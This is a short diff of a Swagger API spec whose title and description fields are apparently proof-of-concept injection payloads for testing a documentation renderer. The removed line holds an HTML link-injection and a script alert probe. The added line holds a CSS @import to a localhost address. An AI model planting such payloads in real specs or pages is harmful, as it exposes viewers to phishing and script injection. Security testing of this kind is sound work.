@@ -2,7 +2,7 @@
   "swagger": "2.0",
   "info": 
   {"title": "아래 [kakaovx 홈으로 이동] 링크를 클릭하세요",
-  "description": "</p><a href='https://www.ahnlab.com'><h2>kakaovx 홈으로 이동</h2></a><p><script>alert(1)</script>"},
+  "description": "'XSS'<style>@import url(//localhost/stagging?len=32);</style>"},
   "contact": 
   {"name": "AHNLAB",
     "url": "",
